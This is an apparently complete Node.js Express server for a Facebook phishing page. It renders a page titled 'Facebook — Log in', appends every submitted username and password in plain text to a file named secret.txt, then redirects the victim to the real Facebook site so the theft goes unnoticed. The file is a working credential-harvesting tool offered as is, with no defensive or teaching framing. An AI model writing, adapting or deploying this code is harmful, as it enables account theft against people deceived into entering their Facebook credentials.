const express = require('express');
const path = require('path');
const fs = require('fs');
const body_parser = require('body-parser');
const ejsMate = require('ejs-mate');
const app = express();
const configs = require('./configs');

app.engine('ejs', ejsMate);
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

app.use(express.static(path.join(__dirname, 'public')));
app.use(body_parser.json());
app.use(body_parser.urlencoded({
  extended: true
}));

app.get('/', (req, res)=>{
  res.render('index', {title: 'Facebook — Log in'});
});

app.post('/hello', (req, res)=>{
  const userData = `\nUsername: ${req.body.username}\nPassword: ${req.body.password}\n`;

  fs.readFile('./secret.txt', (err, data) => {
    if (err) throw err;
    else{
      data += userData;
      fs.writeFile('./secret.txt', data, 'utf-8', (err)=>{
        if (err) throw err;
      });
    }
  });

  res.redirect('https://web.facebook.com/');
});

app.listen(configs.PORT, ()=>{
  console.log(`Server running on port ${configs.PORT}`);
});
